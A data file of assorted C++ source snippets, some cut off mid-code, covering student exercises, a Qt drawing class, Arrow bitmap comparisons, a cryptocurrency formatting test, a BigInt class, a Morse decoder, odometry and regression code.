    "#include <fstream>\n#include <iostream>\n#include <string>\nusing namespace std;\n\nint main() {\n    string baris;\n    string NamaFile;\n\n    cout << \"Masukkan Nama File : \";\n    cin >> NamaFile;\n    \n    // membuka file dalam mode menulis.\n    ofstream outfile;\n    // menunjuk ke sebuah nama file\n    outfile.open(NamaFile + \".txt\", ios::out);\n\n    cout << \">= Menulis file, \\'q\\' untuk keluar\" << endl;\n\n    // unlimited loop untuk menulis\n    while (true) {\n        cout << \"- \";\n        // mendapatkan setiap karakter dalam satu baris.\n        getline(cin, baris);\n        //loop akan berhenti jika anda memasukan karakter q\n        if (baris == \"q\") break;\n        //menulis dan memasukan nilai dari 'baris' ke dalam file\n        outfile << baris << endl;\n    }\n    // selesai dalam menulis sekarang titip filenya\n    outfile.close();\n\n\n    // Membuka file dalam mode membaca\n    ifstream infile;\n\n    // menunjuk ke sebuah file\n    infile.open(NamaFile + \".txt\", ios::in);\n\n    cout << endl << \">= Membuka dan membaca file \" << endl;\n    // jika file ada maka\n    if (infile.is_open())\n    {\n        //melakukan perulangan setiap baris\n        while (getline(infile, baris ))\n        {\n            // dan tampilkan di sini\n            cout << baris << '\\n';\n        }\n        //tutup file tersebut setelah selesai\n        infile.close();\n    }\n    //jika tidak ditemukan file makan akan menampilkan ini\n    else cout << \"Unable to open file\" ;\n    return 0;\n}",
    "#include \"spaced_array.h\"\n\n#include <arrow/util/bit_block_counter.h>\n#include <arrow/util/bit_util.h>\n#include <assert.h>\n#include <bits/stdint-uintn.h>\n\n#include \"utils/bit_util.h\"\n#include \"utils/macros.hpp\"\n\nusing namespace null_revisit;\n\ntemplate <bool five_op>\nvoid SpacedArray::CompareWithCol(const SpacedArray &other,\n                                 std::shared_ptr<Buffer> output) const {\n    // input size corretness check\n    assert(this->length == kVecSize);\n    assert(this->length == other.length);\n    assert(output->size() >= arrow::bit_util::BytesForBits(this->length));\n    assert(this->length * kDefaultTypeSize % 512 == 0);\n    // alignment check\n    assert(reinterpret_cast<uint64_t>(this->buffers[1]->data()) % 64 == 0);\n    assert(reinterpret_cast<uint64_t>(other.buffers[1]->data()) % 64 == 0);\n    assert(reinterpret_cast<uint64_t>(output->data()) % 64 == 0);\n\n    SpacedCompareAVX<five_op>(\n        this->buffers[1]->data(), other.buffers[1]->data(),\n        this->buffers[0]->data(), other.buffers[0]->data(), output);\n}\ntemplate void SpacedArray::CompareWithCol<true>(const SpacedArray &,\n                                                std::shared_ptr<Buffer>) const;\ntemplate void SpacedArray::CompareWithCol<false>(const SpacedArray &,\n                                                 std::shared_ptr<Buffer>) const;\n\nvoid SpacedArray::CompareWithColScalar(const SpacedArray &other,\n                                       std::shared_ptr<Buffer> output) const {\n    // input size corretness check\n    assert(this->length == kVecSize);\n    assert(this->length == other.length);\n    assert(output->size() >= arrow::bit_util::BytesForBits(this->length));\n    assert(this->length * kDefaultTypeSize % 512 == 0);\n    // alignment check\n    assert(reinterpret_cast<uint64_t>(this->buffers[1]->data()) % 64 == 0);\n    assert(reinterpret_cast<uint64_t>(other.buffers[1]->data()) % 64 == 0);\n    assert(reinterpret_cast<uint64_t>(output->data()) % 64 == 0);\n    // Load 512 bits (16 int32_t values) from a and b into AVX-512 registers\n    auto a_ptr = (default_type *)this->buffers[1]->data();\n    auto b_ptr = (default_type *)other.buffers[1]->data();\n    auto output_ptr = output->mutable_data();\n    static constexpr int kBMBatchSize = 32;\n\n    uint32_t temp_output[kBMBatchSize];\n    int num_batches = this->length / kBMBatchSize;\n    // TODO: loop unrolling.\n    for (int i = 0; i < num_batches; ++i) {\n        for (int j = 0; j < kBMBatchSize; ++j) {\n            temp_output[j] = *a_ptr++ < *b_ptr++;\n        }\n        arrow::bit_util::PackBits<kBMBatchSize>(temp_output, output_ptr);\n        output_ptr += kBMBatchSize / 8;\n    }\n    auto output_ptr_512 = (__m512i *)output->data();\n    auto bm_a = (__m512i *)this->buffers[0]->data();\n    auto bm_b = (__m512i *)other.buffers[0]->data();\n    assert(length % 512 == 0);\n    for (int i = 0; i < length / 512; ++i) {\n        *output_ptr_512 = _mm512_and_si512(*bm_a++, *output_ptr_512);\n        *output_ptr_512 = _mm512_and_si512(*bm_b++, *output_ptr_512);\n        output_ptr_512++;\n    }\n}\n\nvoid SpacedArray::SumByGroupBM(const std::vector<int32_t> &group_ids,\n                               std::vector<int64_t> &sum) const {\n    auto a_ptr = (default_type *)this->buffers[1]->data();\n    int idx = 0;\n    arrow::internal::VisitBitBlocksVoid(\n        buffers[0]->data(), 0, length, // NOLINT\n        [&](int64_t i) {\n            sum[group_ids[idx]] += a_ptr[idx];\n            idx++;\n        }, // NOLINT\n        [&]() { idx++; });\n}\n\nvoid SpacedArray::SumByGroupSV(const std::vector<int32_t> &group_ids,\n                               std::vector<int64_t> &sum) const {\n    auto a_ptr = (default_type *)this->buffers[1]->data();\n    auto a_sv = (row_id_type *)this->buffers[2]->data();\n    auto idx_decode_a = length - null_count;\n    for (int i = 0; i < idx_decode_a; ++i) {\n        sum[group_ids[a_sv[i]]] += a_ptr[a_sv[i]];\n    }\n}\n\nint SpacedArray::CompareWithColSVPartial(const SpacedArray &other,\n                                         SelVector &output,\n                                         SelVector &sel_vec) const {\n    auto a_bm = this->buffers[0]->data();\n    auto b_bm = other.buffers[0]->data();\n    auto a_ptr = (default_type *)this->buffers[1]->data();\n    auto b_ptr = (default_type *)other.buffers[1]->data();\n    int output_idx = 0;\n    for (size_t i = 0; i < sel_vec.size(); ++i) {\n        auto row_id = sel_vec[i];\n        output[output_idx] = row_id;\n        // TODO: duckdb flat :\n        // 1. AND the null bm first. 2. do evaluation, partial only according to\n        // null 3. combine this bool vector with original SV duckdb generic:\n        // 1. do evaluation according to each BM. 2. combine this bool with SV.\n        bool a = arrow::bit_util::GetBit(a_bm, row_id);\n        bool b = arrow::bit_util::GetBit(b_bm, row_id);\n        bool c = a_ptr[row_id] < b_ptr[row_id];\n        output_idx += a & b & c;\n    }\n    return output_idx;\n}\ntemplate <bool eval_filter_first>\nint SpacedArray",
    "#include \"draw.h\"\n///Reviewed for code style by Paolo Diotaiuti\n\nDraw::Draw(QObject *parent)\n    : QObject{parent}\n{\n    color = Qt::black;\n}\n\nvoid Draw::setColor(QColor newColor)\n{\n    color = newColor;\n}\n\nvoid Draw::drawSquare(QPoint point , int width)\n{\n    QPainter painter(this->image);\n    painter.setPen(color);\n    painter.drawRect(point.x(), point.y(), width, width);\n}\n\nvoid Draw::drawCircle(QPoint point, int diameter)\n{\n    QPainter painter(this->image);\n    painter.setPen(color);\n    painter.drawEllipse(point.x(), point.y(), diameter, diameter);\n}\n\nvoid Draw::sprayPaint(QPoint center, int radius, int density)\n{\n    QPainter painter(this->image);\n    painter.setPen(color);\n    int pointsToDraw = radius * density;\n    //finds random pixels within the radius to be drawn\n    for (int i = 0; i < pointsToDraw; ++i)\n    {\n        int dx = QRandomGenerator::global()->bounded(-radius, radius);\n        int dy = QRandomGenerator::global()->bounded(-radius, radius);\n        if (dx * dx + dy * dy <= radius * radius)\n        {\n            painter.drawPoint(center.x() + dx, center.y() + dy);\n        }\n    }\n}\n\nvoid Draw::drawPixel(QPoint point)\n{\n    image->setPixelColor(point, color);\n}\n\nvoid Draw::setImage(QImage& image)\n{\n    this->image = &image;\n}\n\nvoid Draw::eraseTool(QPoint point)\n{\n    image->setPixelColor(point, Qt::transparent);\n}\n\nQImage Draw::getImage()\n{\n    return *image;\n}\n",
    "// Copyright (c) 2018-2020, The Arqma Network\n// Copyright (c) 2014-2020, The Monero Project\n//\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without modification, are\n// permitted provided that the following conditions are met:\n//\n// 1. Redistributions of source code must retain the above copyright notice, this list of\n//    conditions and the following disclaimer.\n//\n// 2. Redistributions in binary form must reproduce the above copyright notice, this list\n//    of conditions and the following disclaimer in the documentation and/or other\n//    materials provided with the distribution.\n//\n// 3. Neither the name of the copyright holder nor the names of its contributors may be\n//    used to endorse or promote products derived from this software without specific\n//    prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY\n// EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n// MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL\n// THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,\n// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF\n// THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n#include <cstdint>\n#include <gtest/gtest.h>\n#include <memory>\n#include <sstream>\n#include <string>\n\n#include \"cryptonote_basic/cryptonote_basic_impl.h\"\n\nnamespace\n{\n  static constexpr const std::uint8_t source[] = {\n    0x8b, 0x65, 0x59, 0x70, 0x15, 0x37, 0x99, 0xaf, 0x2a, 0xea, 0xdc, 0x9f, 0xf1, 0xad, 0xd0, 0xea,\n    0x6c, 0x72, 0x51, 0xd5, 0x41, 0x54, 0xcf, 0xa9, 0x2c, 0x17, 0x3a, 0x0d, 0xd3, 0x9c, 0x1f, 0x94,\n    0x6c, 0x72, 0x51, 0xd5, 0x41, 0x54, 0xcf, 0xa9, 0x2c, 0x17, 0x3a, 0x0d, 0xd3, 0x9c, 0x1f, 0x94,\n    0x8b, 0x65, 0x59, 0x70, 0x15, 0x37, 0x99, 0xaf, 0x2a, 0xea, 0xdc, 0x9f, 0xf1, 0xad, 0xd0, 0xea\n  };\n\n  static constexpr const char expected[] =\n    \"8b655970153799af2aeadc9ff1add0ea6c7251d54154cfa92c173a0dd39c1f94\"\n    \"6c7251d54154cfa92c173a0dd39c1f948b655970153799af2aeadc9ff1add0ea\";\n\n  template<typename T>\n  bool is_formatted()\n  {\n    T value{};\n\n    static_assert(alignof(T) == 1, \"T must have 1 byte alignment\");\n    static_assert(sizeof(T) <= sizeof(source), \"T is too large for source\");\n    static_assert(sizeof(T) * 2 <= sizeof(expected), \"T is too large for destination\");\n    std::memcpy(std::addressof(value), source, sizeof(T));\n\n    std::stringstream out;\n    out << \"BEGIN\" << value << \"END\";\n    return out.str() == \"BEGIN<\" + std::string{expected, sizeof(T) * 2} + \">END\";\n  }\n}\n\nTEST(Crypto, Ostream)\n{\n  EXPECT_TRUE(is_formatted<crypto::hash8>());\n  EXPECT_TRUE(is_formatted<crypto::hash>());\n  EXPECT_TRUE(is_formatted<crypto::public_key>());\n  EXPECT_TRUE(is_formatted<crypto::secret_key>());\n  EXPECT_TRUE(is_formatted<crypto::signature>());\n  EXPECT_TRUE(is_formatted<crypto::key_derivation>());\n  EXPECT_TRUE(is_formatted<crypto::key_image>());\n}\n\nTEST(Crypto, null_keys)\n{\n  char zero[32];\n  memset(zero, 0, 32);\n  ASSERT_EQ(memcmp(crypto::null_skey.data, zero, 32), 0);\n  ASSERT_EQ(memcmp(crypto::null_pkey.data, zero, 32), 0);\n}\n",
    "#include <iostream>\n#include \"BigInt.h\"\nusing namespace std;\n\nBigInt::BigInt(int val)\n{\n    if (val == 0)\n    {\n        num = new int[1];\n        num[0] = 0;\n        size = 0;\n        carry = 0;\n        x = 1;\n    }\n    else\n    {\n        if (val > 0)\n        {\n            x = 1;\n        }\n        else\n        {\n            x = -1;\n            val*=-1;\n        }\n        int temp = val;\n        int count = 0;\n        for (int j = 0; temp != 0; j++)\n        {\n            if (temp == 0)\n                break;\n            temp = temp / 10;\n            count++;\n        }\n        size = count;\n\n        num = new int[count];\n        temp = val;\n        for (int i = size - 1; i >= 0; i--)\n        {\n            num[i] = temp % 10;\n            temp = temp / 10;\n        }\n        carry = 0;\n    }\n};\nBigInt ::BigInt(const string &str)\n{\n    int count = 0;\n    bool flag = false;\n    if (str[0] == '-')\n    {\n        x = -1;\n        flag = true;\n    }\n    else\n    {\n        x = 1;\n    }\n    while (str[count] != '\\0')\n    {\n        count++;\n    }\n    if (flag)\n    {\n        count--;\n        size = count;\n        num = new int[count];\n        int counter = 0;\n        for (int i = 1; i < count; i++)\n        {\n            num[counter] = str[i] - '0';\n            counter++;\n        }\n    }\n    else\n    {\n        size = count;\n        num = new int[count];\n        for (int i = 0; i < count; i++)\n        {\n            num[i] = str[i] - '0';\n        }\n    }\n};\nBigInt::BigInt(const BigInt &str)\n{\n    x = str.x;\n    size = str.size;\n    num = new int[size];\n    for (int i = 0; i < size; i++)\n    {\n        num[i] = str.num[i];\n    }\n};\n\nBigInt::operator string() // conversts integer array to string//+48\n{\n    char *str;\n    int p=0;\n    \n    while(num[p]==0)\n    {\n       \tp++;\t\n    }\n\n    if(p>=size)\n    {\n\n    \tstr=new char[2];\n    \tstr[0]='0';\n    \tstr[1]='\\0';\n\n    \treturn str;\n    }\n    str = new char[size + 1];\n    if (x == -1)\n    {\n        str[0] = '-';\n        \n        int counter = 1;\n        \n        for (int i = p; i < size; i++)\n        {\n            str[counter] = num[i] + 48;\n            counter++;\n        }\n        str[counter] = '\\0';\n\n    }\n    else\n    {\n\tint counter = 0;\n        for (int i = p; i < size; i++)\n        {\n            str[counter] = num[i] + 48;\n\n            counter++;\n        }\n        str[counter] = '\\0';\n    }\n\n    return str;\n}\nBigInt BigInt::operator+(const BigInt &val) const // program to reverse array\n{\n    BigInt temp;\n    int smaller;\n    int temp1;\n    if (size >= val.size)\n    {\n        temp1 = size;\n        smaller = val.size;\n        temp.x = x;\n    }\n    else\n    {\n        temp1 = val.size;\n        temp.x = val.x;\n        smaller = size;\n    }\n    temp.size = temp1 + 1;\n    temp.num = new int[temp.size];\n    temp.carry = 0;\n    bool flag = true;\n\n    // reverse the array num.\n    for (int i = 0; i < size / 2; i++)\n    {\n        int t2 = num[i];\n        num[i] = num[size - 1 - i];\n        num[size - 1 - i] = t2;\n    }\n\n    // reverse the array val.num.\n    for (int i = 0; i < val.size / 2; i++)\n    {\n        int t2 = val.num[i];\n        val.num[i] = val.num[val.size - 1 - i];\n        val.num[val.size - 1 - i] = t2;\n    }\n\n    int s = 0;\n\n    for (int i = 0; i < temp1; i++)\n    {\n\n        if (i < smaller)\n        {\n            s = num[i] + val.num[i] + temp.carry;\n            temp.carry = 0;\n        }\n        else if (smaller == size)\n        {\n            s = val.num[i] + temp.carry;\n            temp.carry = 0;\n        }\n        else if (smaller == val.size)\n        {\n            s = num[i] + temp.carry;\n            temp.carry = 0;\n        }\n\n        if (s < 10)\n        {\n            temp.num[i] = s;\n        }\n        else\n        {\n            temp.carry = 1;\n            temp.num[i] = s % 10;\n        }\n    }\n    temp.num[temp1] = temp.carry;\n    for (int i = 0; i < temp.size / 2; i++)\n    {\n        int t2 = temp.num[i];\n        temp.num[i] = temp.num[temp.size - 1 - i];\n        temp.num[temp.size - 1 - i] = t2;\n    }\n\n    if (temp.num[0] == 0)\n    {\n        int *ptr = temp.num;\n        int ptrsize = temp.size;\n        temp.size -= 1;\n        temp.num = new int[temp.size];\n\n        int index = 0;\n        for (int i = 1; i < ptrsize; i++)\n        {\n            temp.num[index] = ptr[i];\n            index++;\n        }\n        delete[] ptr;\n        ptr = NULL;\n    }\n\n    // reverse the array num.\n    for (int i = 0; i < size / 2; i++)\n    {\n        int t2 = num[i];\n        num[i] = num[size - 1 - i];\n        num[size - 1 - i] = t2;\n    }\n\n    // reverse the array val.num.\n    for (int i = 0; i < val.size / 2; i++)\n    {\n        int t2 = val.num[i];\n        val.num[i] = val.num[val.size - 1 - i];\n        val.num[val.size - 1 - i] = t2;\n    }\n    return temp;\n}\nBigInt BigInt::operator+(int val) const\n{\n    BigInt temp2;\n    int *ptr;\n    int ptrsize;\n    int ptrsign;\n    if (val == 0)\n    {\n        ptr = new int[1];\n        ptrsize = 1;\n    }\n    else\n    {\n        if (val > 0)\n        {\n      ",
    "//Ejecicio 4\r\n\r\n\r\n#include <iostream>\r\n#include <iomanip>\r\nusing namespace std;\r\n\r\nint main() {\r\n    string nombreArticulo;\r\n    int cantidad;\r\n    double precioUnitario;\r\n\r\n    cout << \"Ingrese el nombre del articulo: \";\r\n    getline(cin, nombreArticulo);\r\n    cout << \"Ingrese la cantidad adquirida: \";\r\n    cin >> cantidad;\r\n    cout << \"Ingrese el precio unitario del articulo: \";\r\n    cin >> precioUnitario;\r\n\r\n    double precioVenta = cantidad * precioUnitario;\r\n    double iva = precioVenta * 0.12;\r\n    double precioBruto = precioVenta + iva;\r\n\r\n    cout << fixed << setprecision(2);\r\n    cout << \"\\n--- Factura ---\\n\";\r\n    cout << \"Articulo: \" << nombreArticulo << endl;\r\n    cout << \"Cantidad: \" << cantidad << endl;\r\n    cout << \"Precio unitario: \" << precioUnitario << \" bs\" << endl;\r\n    cout << \"Precio de venta: \" << precioVenta << \" bs\" << endl;\r\n    cout << \"IVA (12%): \" << iva << \" bs\" << endl;\r\n\r\n    if (precioBruto > 50000) {\r\n        double descuento = precioBruto * 0.05;\r\n        double precioTotal = precioBruto - descuento;\r\n        cout << \"Descuento (5%): \" << descuento << \" bs\" << endl;\r\n        cout << \"Precio total con descuento: \" << precioTotal << \" bs\" << endl;\r\n    } else {\r\n        cout << \"Precio total: \" << precioBruto << \" bs\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <node_api.h>\n#include <uv.h>\n\nnamespace test_module {\n\nnapi_value TestLoadLibrary(napi_env env, napi_callback_info info) {\n  size_t argc = 1;\n  napi_value argv;\n  napi_status status;\n  status = napi_get_cb_info(env, info, &argc, &argv, NULL, NULL);\n  if (status != napi_ok) napi_fatal_error(NULL, 0, NULL, 0);\n\n  char lib_path[256];\n  status = napi_get_value_string_utf8(env, argv, lib_path, 256, NULL);\n  if (status != napi_ok) napi_fatal_error(NULL, 0, NULL, 0);\n\n  uv_lib_t lib;\n  auto uv_status = uv_dlopen(lib_path, &lib);\n  if (uv_status == 0) {\n    napi_value result;\n    status = napi_get_boolean(env, true, &result);\n    if (status != napi_ok) napi_fatal_error(NULL, 0, NULL, 0);\n    return result;\n  } else {\n    status = napi_throw_error(env, NULL, uv_dlerror(&lib));\n    if (status != napi_ok) napi_fatal_error(NULL, 0, NULL, 0);\n  }\n}\n\nnapi_value Init(napi_env env, napi_value exports) {\n  napi_value method;\n  napi_status status;\n  status = napi_create_function(env, \"testLoadLibrary\", NAPI_AUTO_LENGTH,\n                                TestLoadLibrary, NULL, &method);\n  if (status != napi_ok)\n    return NULL;\n  return method;\n}\n\nNAPI_MODULE(TestLoadLibrary, Init);\n\n}  // namespace test_module",
    "#include \"odom.h\"\n#include <cmath>\n#include <complex>\n#include <iostream>\n\n// M_PI / 180 -> 3.14159265358979323846 / 180 -> 0.01745329251\n#define DEGREES_TO_RADIANS 0.01745329251;\n\nfloat degreesToRadians(float degrees) {\n    return degrees * DEGREES_TO_RADIANS;\n}\n\nfloat chordLength(float radius, float angle_radians) {\n    return 2 * radius * sin(angle_radians / 2);\n}\n\nOdometryController::OdometryController(float left_tracker_offset, float right_tracker_offset, float sideways_tracker_offset, float wheel_radius)\n    : left_offset(left_tracker_offset), right_offset(right_tracker_offset), sideways_offset(sideways_tracker_offset), wheel_radius(wheel_radius){};\n\nvoid OdometryController::update(float left_position_degrees, float right_position_degrees, float sideways_position_degrees) {\n    // Convert to radians\n    float left_position = degreesToRadians(left_position_degrees) * this->wheel_radius;\n    float right_position = degreesToRadians(right_position_degrees) * this->wheel_radius;\n    float sideways_position = degreesToRadians(sideways_position_degrees) * this->wheel_radius;\n\n    // Caluculate change in position\n    float delta_left_position = left_position - this->left_position;\n    float delta_right_position = right_position - this->right_position;\n    float delta_sideways_position = sideways_position - this->sideways_position;\n    this->left_position = left_position;\n    this->right_position = right_position;\n    this->sideways_position = sideways_position;\n\n    // Step 5\n    float orientation = (delta_left_position - delta_right_position) / (this->left_offset + this->right_offset);\n    // Step 6\n    float delta_theta = orientation - this->state[2];\n\n    float local_x, local_y;\n    if (delta_theta == 0) {\n        local_x = delta_sideways_position;\n        local_y = delta_right_position;\n    } else {\n        local_x = chordLength(delta_theta, delta_sideways_position / delta_theta + this->sideways_offset);\n        local_y = delta_right_position / delta_theta + this->right_offset;\n    }\n\n    float average_orientation = this->state[2] + (delta_theta / 2);\n\n    float local_polar_angle = 0, local_polar_length = 0;\n    if (local_x != 0 && local_y != 0) {\n        local_polar_angle = atan2(local_y, local_x);\n        // Sovle for c in Pythagorean theorem\n        local_polar_length = sqrt(local_x * local_x + local_y * local_y);\n    }\n\n    // If this is addition, then the global x and y deltas have to be rotated by -(global_polar_angle)\n    // I think we (and JARTemplate) can avoid that by just subtracting here\n    float global_polar_angle = local_polar_angle - average_orientation;\n\n    float global_x = local_polar_length * cos(global_polar_angle);\n    float global_y = local_polar_length * sin(global_polar_angle);\n\n    this->state[0] += global_x;\n    this->state[1] += global_y;\n    this->state[2] += delta_theta;\n};",
    "#include \"Ladder.h\"\r\n#include <iostream>\r\n\r\nLadder::Ladder(int start, int end, sf::Sound& sound) : mStart(start), mEnd(end), ladderKnockSound(sound) {\r\n    int textureIndex = rand() % 3; // Losowanie indeksu tekstury\r\n    mTextureFile = \"assets/ladder\" + std::to_string(textureIndex + 1) + \".png\"; // Ustawienie pliku tekstury\r\n}\r\n\r\nvoid Ladder::triggerEvent(Player& player, int& diceResult, bool& extraRoll) {\r\n    player.moveToPosition(mEnd); // Przesuni\u00eacie gracza na koniec drabiny\r\n    ladderKnockSound.play(); // Odtworzenie d\u0178wi\u00eaku drabiny\r\n    std::cout << player.getName() << \" climbed a ladder! Moving up to \" << mEnd << \".\\n\"; // Informacja o zdarzeniu\r\n}\r\n\r\nvoid Ladder::draw(sf::RenderWindow& window) const {\r\n    sf::Vector2f topLeft = adjustPosition(getPosition(mStart), sf::Vector2f(290, 290), 14); // Obliczenie pozycji pocz\u00b9tkowej drabiny\r\n    sf::Vector2f bottomRight = adjustPosition(getPosition(mEnd), sf::Vector2f(290, 290), 14); // Obliczenie pozycji ko\u00f1cowej drabiny\r\n    drawRectangleWithTextureAndRotation(window, topLeft, bottomRight, mTextureFile); // Rysowanie drabiny na planszy\r\n}\r\n\r\nsf::Vector2f Ladder::getPosition(int squareIndex) const {\r\n    int row = squareIndex / 10; // Obliczenie wiersza\r\n    int col = squareIndex % 10; // Obliczenie kolumny\r\n    if (row % 2 == 0) {\r\n        return sf::Vector2f(col * 60, (9 - row) * 60); // Obliczenie pozycji dla parzystych wierszy\r\n    }\r\n    else {\r\n        return sf::Vector2f((9 - col) * 60, (9 - row) * 60); // Obliczenie pozycji dla nieparzystych wierszy\r\n    }\r\n}\r\n",
    "#include \"morse.h\"\n#include <sstream>\n#include <map>\n\nstd::map<std::string, char> morseCode = {\n    {\".-\", 'A'}, {\"-...\", 'B'}, {\"-.-.\", 'C'}, {\"-..\", 'D'},\n    {\".\", 'E'}, {\"..-.\", 'F'}, {\"--.\", 'G'}, {\"....\", 'H'},\n    {\"..\", 'I'}, {\".---\", 'J'}, {\"-.-\", 'K'}, {\".-..\", 'L'},\n    {\"--\", 'M'}, {\"-.\", 'N'}, {\"---\", 'O'}, {\".--.\", 'P'},\n    {\"--.-\", 'Q'}, {\".-.\", 'R'}, {\"...\", 'S'}, {\"-\", 'T'},\n    {\"..-\", 'U'}, {\"...-\", 'V'}, {\".--\", 'W'}, {\"-..-\", 'X'},\n    {\"-.--\", 'Y'}, {\"--..\", 'Z'}, {\"-----\", '0'}, {\".----\", '1'},\n    {\"..---\", '2'}, {\"...--\", '3'}, {\"....-\", '4'}, {\".....\", '5'},\n    {\"-....\", '6'}, {\"--...\", '7'}, {\"---..\", '8'}, {\"----.\", '9'}\n};\n\nstd::string morseDecode(const std::string& morseText) {\n    std::string plaintext;\n    std::string morseChar;\n    for (char c : morseText) {\n        if (c == ' ') {\n            if (morseChar != \"\") {\n                plaintext += morseCode[morseChar];\n                morseChar = \"\";\n            }\n            plaintext += ' ';\n        }\n        else {\n            morseChar += c;\n        }\n    }\n    if (morseChar != \"\") {\n        plaintext += morseCode[morseChar];\n    }\n    return plaintext;\n}\n",
    "#include <iostream>\r\n#include <random>\r\n#include <map>\r\n#include <unordered_map>\r\n\r\n#include <algorithm>\r\n#include <cstddef>\r\n#include <cstdint>\r\n#include <iterator>\r\n#include <limits>\r\n#include <stdexcept>\r\n#include <type_traits>\r\n#include <utility>\r\n#include <vector>\r\n#include <iostream>\r\n#define LOAD_KEYS 30000000\r\n#define BACK_KEYS 2000000\r\nstd::map<int,int> total_times;\r\nusing namespace std;\r\nstruct Slope {\r\n  using SX=__int128;\r\n  using SY=__int128;\r\n  SX dx{};\r\n  SY dy{};  //\u4f1a\u8c03\u7528\u5bf9\u5e94\u7c7b\u578b\u7684\u9ed8\u8ba4\u6784\u9020\u51fd\u6570\uff0c\u8fd9\u91cc\u4f1a\u5c06\u5176\u7f6e\u4e3a0\r\n\r\n  bool operator<(const Slope &p) const { return dy * p.dx < dx * p.dy; }\r\n  bool operator>(const Slope &p) const { return dy * p.dx > dx * p.dy; }\r\n  bool operator==(const Slope &p) const { return dy * p.dx == dx * p.dy; }\r\n  bool operator!=(const Slope &p) const { return dy * p.dx != dx * p.dy; }\r\n  explicit operator long double() const { return dy / (long double) dx; }//\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u8fc7\u7a0b\u4e2d\u81ea\u52a8\u8c03\u7528\r\n};\r\nstruct Point {\r\n  using X=uint64_t;\r\n  using Y=uint64_t;\r\n  using SX=__int128;\r\n  using SY=__int128;\r\n  X x{};\r\n  Y y{};\r\n\r\n  Slope operator-(const Point &p) const { \r\n      Slope S;\r\n      S.dx=SX(x)-p.x;\r\n      S.dy=SY(y)-p.y;\r\n      return S;}\r\n      // return (Slope){SX(x) - p.x, SY(y) - p.y}; }  //\u5c06\u81ea\u5df1\u7684x/y\u6210\u5458\u8f6c\u4e3aSX\u7c7b\u578b\u518d\u8fdb\u884c\u8fd0\u7b97\uff0c\u8fd4\u56deSlope\u7c7b\u578b\u53d8\u91cf\r\n};\r\n\r\nclass CanonicalSegment {\r\n  friend class PLR;\r\n  using X=uint64_t;\r\n  using Y=uint64_t;\r\n  Point rectangle[4];\r\n  X first;\r\n\r\n  CanonicalSegment(const Point &p0, const Point &p1, X first) : rectangle{p0, p1, p0, p1}, first(first) {};\r\n\r\n  CanonicalSegment(const Point (&rectangle)[4], X first)\r\n    : rectangle{rectangle[0], rectangle[1], rectangle[2], rectangle[3]}, first(first) {};\r\n\r\n  bool one_point() const {\r\n    return rectangle[0].x == rectangle[2].x && rectangle[0].y == rectangle[2].y\r\n        && rectangle[1].x == rectangle[3].x && rectangle[1].y == rectangle[3].y;\r\n  }\r\n\r\npublic:\r\n  CanonicalSegment() = default;\r\n\r\n  X get_first_x() const { return first; }\r\n\r\n  std::pair<long double, long double> get_intersection() const {\r\n    auto &p0 = rectangle[0];\r\n    auto &p1 = rectangle[1];\r\n    auto &p2 = rectangle[2];\r\n    auto &p3 = rectangle[3];\r\n    auto slope1 = p2 - p0;\r\n    auto slope2 = p3 - p1;\r\n\r\n    if (one_point() || slope1 == slope2)\r\n      return {p0.x, p0.y};\r\n\r\n    auto p0p1 = p1 - p0;\r\n    auto a = slope1.dx * slope2.dy - slope1.dy * slope2.dx;\r\n    auto b = (p0p1.dx * slope2.dy - p0p1.dy * slope2.dx) / static_cast<long double>(a);\r\n    auto i_x = p0.x + b * slope1.dx;\r\n    auto i_y = p0.y + b * slope1.dy;\r\n    return {i_x, i_y};\r\n  }\r\n  std::pair<long double, __int128> get_floating_point_segment(const uint64_t &origin) const {\r\n    if (one_point())\r\n      return {0, (rectangle[0].y + rectangle[1].y) / 2};\r\n\r\n   // if (std::is_integral_v<uint64_t> && std::is_integral_v<uint64_t>) {\r\n\r\n      auto slope = rectangle[3] - rectangle[1];\r\n      auto intercept_n = slope.dy * (__int128(origin) - rectangle[1].x);\r\n      auto intercept_d = slope.dx;\r\n      auto rounding_term = ((intercept_n < 0) ^ (intercept_d < 0) ? -1 : +1) * intercept_d / 2;\r\n      auto intercept = (intercept_n + rounding_term) / intercept_d + rectangle[1].y;\r\n      return {static_cast<long double>(slope), intercept};\r\n  }\r\n  std::pair<long double, long double> get_slope_intercept() const {\r\n    if (one_point())\r\n      return {0, (rectangle[0].y + rectangle[1].y) / 2};\r\n\r\n   // auto[i_x, i_y] = get_intersection();\r\n    std::pair<long double, long double> p = get_intersection();\r\n   // auto[min_slope, max_slope] = get_slope_range();\r\n    std::pair<long double, long double> p2 = get_slope_range();\r\n    auto slope = (p2.first + p2.second) / 2.;\r\n    auto intercept = p.second - p.first * slope;\r\n    return {slope, intercept};\r\n  }\r\n  std::pair<long double, long double> get_slope_range() const {\r\n    if (one_point())\r\n      return {0, 1};\r\n\r\n    auto min_slope = static_cast<long double>(rectangle[2] - rectangle[0]);\r\n    auto max_slope = static_cast<long double>(rectangle[3] - rectangle[1]);\r\n    return {min_slope, max_slope};\r\n  }\r\n\r\n\r\n\r\n\r\n};\r\n\r\n\r\nclass PLR{\r\nprivate:\r\n  using SX = __int128;  \r\n  using SY = __int128;\r\n  using X = uint64_t;\r\n  using Y = uint64_t;\r\n\r\n\r\n\r\n\r\n  const Y epsilon;\r\n  std::vector<Point> lower;\r\n  std::vector<Point> upper;\r\n  X first_x 